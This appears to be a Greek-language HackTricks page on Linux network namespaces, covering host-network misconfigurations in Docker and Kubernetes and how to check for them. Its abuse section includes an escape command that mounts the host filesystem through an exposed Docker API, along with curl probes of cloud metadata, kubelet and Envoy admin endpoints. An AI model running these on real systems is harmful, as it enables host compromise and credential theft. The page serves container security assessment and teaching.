# Network Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το network namespace απομονώνει πόρους που σχετίζονται με το δίκτυο, όπως interfaces, IP addresses, routing tables, κατάσταση ARP/neighbor, firewall rules, sockets, το abstract socket namespace του UNIX domain και τα περιεχόμενα αρχείων όπως το `/proc/net`. Αυτός είναι ο λόγος για τον οποίο ένα container μπορεί να έχει κάτι που μοιάζει με το δικό του `eth0`, τις δικές του local routes και τη δική του loopback device, χωρίς να διαθέτει το πραγματικό network stack του host.

Από άποψη ασφάλειας, αυτό έχει σημασία επειδή το network isolation αφορά πολύ περισσότερα από το port binding. Ένα private network namespace περιορίζει όσα μπορεί να παρατηρήσει ή να επαναρυθμίσει άμεσα το workload. Μόλις αυτό το namespace γίνει shared με τον host, το container μπορεί ξαφνικά να αποκτήσει ορατότητα σε host listeners, host-local services, abstract AF_UNIX endpoints και network control points που δεν προορίζονταν ποτέ να εκτεθούν στην εφαρμογή.

## Λειτουργία

Ένα freshly created network namespace ξεκινά με ένα κενό ή σχεδόν κενό network environment, μέχρι να συνδεθούν interfaces σε αυτό. Στη συνέχεια, τα container runtimes δημιουργούν ή συνδέουν virtual interfaces, εκχωρούν addresses και ρυθμίζουν routes, ώστε το workload να έχει την αναμενόμενη συνδεσιμότητα. Σε bridge-based deployments, αυτό συνήθως σημαίνει ότι το container βλέπει ένα veth-backed interface συνδεδεμένο σε ένα host bridge. Στο Kubernetes, τα CNI plugins αναλαμβάνουν την αντίστοιχη ρύθμιση για το Pod networking.

Αυτή η αρχιτεκτονική εξηγεί γιατί το `--network=host` ή το `hostNetwork: true` αποτελεί τόσο δραματική αλλαγή. Αντί να λάβει ένα έτοιμο private network stack, το workload συνδέεται στο πραγματικό network stack του host.

## Εργαστήριο

Μπορείτε να δείτε ένα σχεδόν κενό network namespace με:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Και μπορείτε να συγκρίνετε τα κανονικά containers με τα containers που χρησιμοποιούν host network με:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Το host-networked container δεν διαθέτει πλέον τη δική του απομονωμένη προβολή socket και interface. Αυτή η αλλαγή από μόνη της είναι ήδη σημαντική, πριν ακόμη εξετάσετε ποιες capabilities διαθέτει η διεργασία.

## Χρήση Runtime

Τα Docker και Podman συνήθως δημιουργούν ένα private network namespace για κάθε container, εκτός αν ρυθμιστούν διαφορετικά. Το Kubernetes συνήθως παρέχει σε κάθε Pod το δικό του network namespace, το οποίο μοιράζονται τα containers μέσα σε αυτό το Pod, αλλά παραμένει ξεχωριστό από το host. Αυτό σημαίνει ότι το `127.0.0.1` αφορά συνήθως ολόκληρο το Pod και όχι μόνο το container: ένας listener που έχει γίνει bind μόνο στο localhost σε ένα container είναι συνήθως προσβάσιμος από τα sidecars και τα υπόλοιπα containers του Pod. Τα συστήματα Incus/LXC παρέχουν επίσης πλούσια απομόνωση βασισμένη σε network namespaces, συχνά με μεγαλύτερη ποικιλία virtual networking setups.

Η κοινή αρχή είναι ότι το private networking αποτελεί το προεπιλεγμένο όριο απομόνωσης, ενώ το host networking είναι μια ρητή εξαίρεση από αυτό το όριο.

## Misconfigurations

Το σημαντικότερο misconfiguration είναι απλώς η κοινή χρήση του network namespace του host. Αυτό γίνεται μερικές φορές για λόγους performance, low-level monitoring ή ευκολίας, αλλά καταργεί ένα από τα πιο καθαρά όρια που είναι διαθέσιμα στα containers. Οι host-local listeners γίνονται άμεσα προσβάσιμοι, υπηρεσίες που είναι διαθέσιμες μόνο στο localhost μπορεί να γίνουν προσβάσιμες, ενώ capabilities όπως `CAP_NET_ADMIN` ή `CAP_NET_RAW` γίνονται πολύ πιο επικίνδυνες, επειδή οι λειτουργίες που επιτρέπουν εφαρμόζονται πλέον στο ίδιο το network environment του host.

Ένα ακόμη πρόβλημα είναι η υπερβολική παραχώρηση network-related capabilities, ακόμη και όταν το network namespace είναι private. Ένα private namespace παρέχει όντως προστασία, αλλά δεν καθιστά τα raw sockets ή το advanced network control ακίνδυνα.

Στο Kubernetes, το `hostNetwork: true` αλλάζει επίσης το πόσο μπορείτε να βασιστείτε στο network segmentation σε επίπεδο Pod. Το Kubernetes αναφέρει ότι πολλά network plugins δεν μπορούν να διακρίνουν σωστά την κίνηση ενός `hostNetwork` Pod για matching με `podSelector` / `namespaceSelector` και, επομένως, την αντιμετωπίζουν ως ordinary node traffic. Από την οπτική γωνία ενός attacker, αυτό σημαίνει ότι ένα compromised `hostNetwork` workload θα πρέπει συχνά να αντιμετωπίζεται ως network foothold σε επίπεδο node και όχι ως ένα κανονικό Pod που εξακολουθεί να περιορίζεται από τις ίδιες policy assumptions με τα workloads σε overlay-network.

## Abuse

Σε weakly isolated setups, οι attackers μπορεί να επιθεωρήσουν host listening services, να αποκτήσουν πρόσβαση σε management endpoints που είναι bound μόνο στο loopback, να κάνουν sniffing ή να επηρεάσουν την κίνηση, ανάλογα με τις ακριβείς capabilities και το environment, ή να επαναρυθμίσουν το routing και το firewall state αν υπάρχει `CAP_NET_ADMIN`. Σε ένα cluster, αυτό μπορεί επίσης να διευκολύνει το lateral movement και το control-plane reconnaissance.

Αν υποψιάζεστε host networking, ξεκινήστε επιβεβαιώνοντας ότι τα ορατά interfaces και οι listeners ανήκουν στο host και όχι σε ένα isolated container network:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Οι υπηρεσίες που είναι προσβάσιμες μόνο μέσω loopback είναι συχνά η πρώτη ενδιαφέρουσα ανακάλυψη:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Τα abstract UNIX sockets είναι ένας ακόμη εύκολος στόχος που μπορεί να παραβλεφθεί, επειδή περιορίζονται στο network namespace, παρόλο που δεν μοιάζουν με TCP/UDP listeners και ενδέχεται να μην υπάρχουν ως paths στο filesystem κάτω από το `/run`. Επομένως, ένα container με host network μπορεί να κληρονομήσει πρόσβαση σε control channels που είναι διαθέσιμα μόνο στον host και δεν έγιναν ποτέ bind-mounted στο container:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Ιστορικό παράδειγμα ήταν το bug έκθεσης abstract socket του `containerd-shim`, όμως το ευρύτερο μάθημα είναι σημαντικότερο από το συγκεκριμένο CVE: μόλις ένα workload ενταχθεί στο host network namespace, οι υπηρεσίες abstract AF_UNIX αποτελούν επίσης μέρος του attack surface. Αν αυτά τα sockets φαίνονται να σχετίζονται με το runtime ή τη διαχείριση, προχωρήστε στο [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Αν υπάρχουν network capabilities, ελέγξτε αν το workload μπορεί να επιθεωρήσει ή να τροποποιήσει το ορατό stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Σε σύγχρονους kernels, το host networking σε συνδυασμό με το `CAP_NET_ADMIN` μπορεί επίσης να εκθέσει τη διαδρομή των πακέτων πέρα από απλές αλλαγές σε `iptables` / `nftables`. Τα `tc` qdiscs και filters έχουν επίσης εμβέλεια namespace, επομένως, σε ένα κοινό host network namespace, εφαρμόζονται στις host interfaces που μπορεί να δει το container. Αν υπάρχει επιπλέον και το `CAP_BPF`, αποκτούν επίσης σημασία προγράμματα eBPF που σχετίζονται με το δίκτυο, όπως οι TC και XDP loaders:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Αυτό έχει σημασία επειδή ένας attacker μπορεί να κάνει mirror, redirect, shape ή drop traffic σε επίπεδο host interface, όχι μόνο να τροποποιήσει firewall rules. Σε ένα private network namespace, αυτές οι ενέργειες περιορίζονται στην οπτική του container· σε ένα shared host namespace, επηρεάζουν τον host.

Σε cluster ή cloud περιβάλλοντα, το host networking δικαιολογεί επίσης ένα γρήγορο local recon για metadata και υπηρεσίες που βρίσκονται κοντά στο control plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
Στο Kubernetes, να θυμάστε ότι η παραβίαση **οποιουδήποτε** container σε ένα multi-container Pod παρέχει επίσης πρόσβαση στους localhost listeners που έχουν ανοίξει τα sibling containers και τα sidecars, επειδή ολόκληρο το Pod μοιράζεται ένα network namespace. Αυτό είναι ιδιαίτερα σημαντικό για service-mesh, observability και helper containers, των οποίων τα admin ή debug interfaces είναι σκόπιμα εσωτερικά στο Pod και όχι διαθέσιμα σε ολόκληρο το cluster:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Αντιμετώπισε το **bound to localhost** ως **Pod-private**, όχι ως **container-private**. Μετά την παραβίαση ενός container στο Pod, αυτή η υπόθεση παύει να ισχύει.

### Πλήρες Παράδειγμα: Host Networking + Local Runtime / Kubelet Access

Το Host networking δεν παρέχει αυτόματα host root, αλλά συχνά εκθέτει υπηρεσίες που είναι σκόπιμα προσβάσιμες μόνο από τον ίδιο τον node. Αν κάποια από αυτές τις υπηρεσίες προστατεύεται ανεπαρκώς, το Host networking μετατρέπεται σε άμεση διαδρομή για privilege escalation.

Docker API στο localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet στο localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Επίπτωση:

- άμεσο compromise του host αν ένα local runtime API είναι εκτεθειμένο χωρίς κατάλληλη προστασία
- reconnaissance του cluster ή lateral movement αν το kubelet ή local agents είναι προσβάσιμα
- χειραγώγηση traffic ή denial of service σε συνδυασμό με `CAP_NET_ADMIN`

## Έλεγχοι

Στόχος αυτών των ελέγχων είναι να διαπιστωθεί αν το process διαθέτει private network stack, ποιες routes και listeners είναι ορατές και αν η network view μοιάζει ήδη με του host πριν ακόμη ελεγχθούν τα capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Τι είναι ενδιαφέρον εδώ:

- Αν τα `/proc/self/ns/net` και `/proc/1/ns/net` φαίνονται ήδη σαν του host, το container μπορεί να μοιράζεται το network namespace του host ή κάποιο άλλο μη ιδιωτικό namespace.
- Τα `lsns -t net` και `ip netns identify` είναι χρήσιμα όταν το shell βρίσκεται ήδη μέσα σε named ή persistent namespace και θέλετε να το συσχετίσετε με objects του `/run/netns` από την πλευρά του host.
- Το `ss -lntup` είναι ιδιαίτερα χρήσιμο, επειδή αποκαλύπτει listeners που είναι διαθέσιμοι μόνο μέσω loopback και local management endpoints. Τα `ss -xap` και `/proc/net/unix` προσθέτουν την προβολή των abstract sockets, την οποία παραλείπουν οι συνηθισμένες αναζητήσεις sockets στο filesystem.
- Τα routes, τα ονόματα των interfaces, το firewall context, η κατάσταση του `tc` και τα eBPF attachments αποκτούν πολύ μεγαλύτερη σημασία αν υπάρχουν τα `CAP_NET_ADMIN`, `CAP_NET_RAW` ή `CAP_BPF`.
- Στο Kubernetes, η αποτυχία επίλυσης service-name από ένα `hostNetwork` Pod μπορεί απλώς να σημαίνει ότι το Pod δεν χρησιμοποιεί `dnsPolicy: ClusterFirstWithHostNet`, και όχι ότι το service απουσιάζει.
- Σε Pods με πολλαπλά containers, οι listeners στο localhost ανήκουν σε ολόκληρο το Pod network namespace. Επομένως, ελέγξτε τα sidecars και τα sibling containers προτού θεωρήσετε ότι μια port διαθέσιμη μόνο μέσω loopback δεν είναι προσβάσιμη από το compromised container.

Κατά την αξιολόγηση ενός container, εξετάζετε πάντα το network namespace μαζί με το capability set. Το host networking μαζί με ισχυρά network capabilities αποτελεί πολύ διαφορετικό posture από το bridge networking μαζί με ένα περιορισμένο default capability set.

## References

- [Παρατηρήσεις για το Kubernetes NetworkPolicy και το `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [`network_namespaces(7)` του Linux και απομόνωση abstract UNIX sockets](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory: abstract Unix domain sockets exposed to host-network containers](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [Απαιτήσεις eBPF token και capabilities για network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
